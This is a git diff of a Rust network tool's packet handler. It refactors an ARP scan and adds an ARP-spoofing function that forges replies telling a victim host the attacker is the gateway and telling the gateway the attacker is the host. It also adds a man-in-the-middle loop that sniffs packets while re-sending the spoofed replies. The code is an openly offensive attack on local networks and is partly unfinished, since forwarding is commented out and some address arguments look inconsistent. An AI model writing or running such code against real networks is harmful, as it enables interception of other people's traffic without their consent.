@@ -1,10 +1,10 @@
 use crate::full_packet::FullPacket;
-use crate::network_utils::{self, ARP_HEADER_SIZE, ETHERNET_HEADER_SIZE};
+use crate::host::Host;
+use crate::network_utils::{self, ARP_HEADER_SIZE};
 use crate::sender::Sender;
 use crate::sniffer::Sniffer;
+use tokio::task::JoinHandle;
 use pnet::packet::arp::ArpOperations;
-use pnet::util::MacAddr;
-use std::net::Ipv4Addr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread::sleep;
@@ -17,28 +17,29 @@ pub struct PacketHandler {
 }
 
 impl PacketHandler {
-    pub fn new(interface_name: &str, default_stream_size: usize) -> PacketHandler {
+    pub fn new(interface_name: &str) -> PacketHandler {
         Self {
             sniffer: Arc::new(Mutex::new(Sniffer::new(
                 interface_name,
-                default_stream_size,
             ))),
             sender: Sender::new(interface_name),
         }
+    }
+    
+    pub fn background_sniff(&mut self, shutdown_signal: Arc<AtomicBool>) -> JoinHandle<()> {
+        let sniffer = Arc::clone(&self.sniffer);
+        tokio::spawn(async move {
+            let mut sniffer = sniffer.lock().await;
+            sniffer.sniff_until(shutdown_signal).await;
+        })
+    
     }
 
     pub async fn arp_scan(&mut self) {
         let shutdown_signal = Arc::new(AtomicBool::new(true));
 
         // Spawn the sniffing task
-        let sniffer_task = {
-            let sniffer = Arc::clone(&self.sniffer);
-            let shutdown_signal = Arc::clone(&shutdown_signal);
-            tokio::spawn(async move {
-                let mut sniffer = sniffer.lock().await;
-                sniffer.sniff_until(shutdown_signal).await;
-            })
-        };
+        let sniffer_task = self.background_sniff(shutdown_signal.clone());
 
         // Perform ARP scan asynchronously and allow time for sniffing
         self.sender.scan_arp();
@@ -50,8 +51,8 @@ impl PacketHandler {
 
         // Process the collected packets after sniffing completes
         let sniffer = self.sniffer.lock().await;
-        sniffer.stream.iter().for_each(|packet_stream| {
-            packet_stream.stream.iter().for_each(|packet| match packet {
+        sniffer.stream.iter().for_each(|packet| {
+            match packet {
                 FullPacket::FullArp(arp) if arp.arp.operation == ArpOperations::Reply => {
                     println!(
                         "Mac: {:?}, IP: {:?}",
@@ -59,44 +60,56 @@ impl PacketHandler {
                     );
                 }
                 _ => {}
-            });
-        });
+            };
+        })
     }
 
     // Tell gateway I am the host
     // Tell the host I am the gateway
-    pub async fn arp_spoof(
+    pub fn arp_spoof(
         &mut self,
-        attacker_mac: MacAddr,
-        attacker_ip: Ipv4Addr,
-        host_mac: MacAddr,
-        host_ip: Ipv4Addr,
-        gateway_mac: MacAddr,
-        gateway_ip: Ipv4Addr,
+        spoofed_host: &Host,
+        gateway: &Host
     ) {
+
+        let mut buffer: Vec<u8> = vec![0u8; ARP_HEADER_SIZE];
+        // Tell Host I am the gateway
+        let host_arp_spoof = network_utils::create_arp(
+            &mut buffer,
+            self.sender.host.mac,
+            self.sender.host.mac,
+            gateway.ip,
+            gateway.ip, 
+            ArpOperations::Reply,
+        );
+        self.sender.send_custom_arp(gateway.mac, spoofed_host.mac, host_arp_spoof);
 
         let mut buffer: Vec<u8> = vec![0u8; ARP_HEADER_SIZE];
         let gateway_arp_spoof = network_utils::create_arp(
             &mut buffer,
-            host_mac,
-            gateway_mac,
-            host_ip,
-            attacker_ip,
+            spoofed_host.mac,
+            spoofed_host.mac,
+            self.sender.host.ip,
+            self.sender.host.ip,
             ArpOperations::Reply,
         );
+        self.sender.send_custom_arp(spoofed_host.mac, gateway.mac, gateway_arp_spoof);
+        
 
-        let mut buffer: Vec<u8> = vec![0u8; ARP_HEADER_SIZE];
-        let host_arp_spoof = network_utils::create_arp(
-            &mut buffer,
-            attacker_mac,
-            host_mac,
-            attacker_ip,
-            host_ip,
-            ArpOperations::Reply,
-        );
+
     }
 
-    pub fn man_in_the_middle() {
-        todo!()
+    pub async fn man_in_the_middle(&mut self, spoofed_host: &Host, gateway: &Host) {
+        
+        
+        loop {
+            
+            let packet= self.sniffer.lock().await.sniff_raw().expect("Can't sniff packet");
+            self.arp_spoof(spoofed_host, gateway);
+            // self.sender.send(&packet);
+        }
+        // Spawn the sniffing task
+
+        
     }
 }
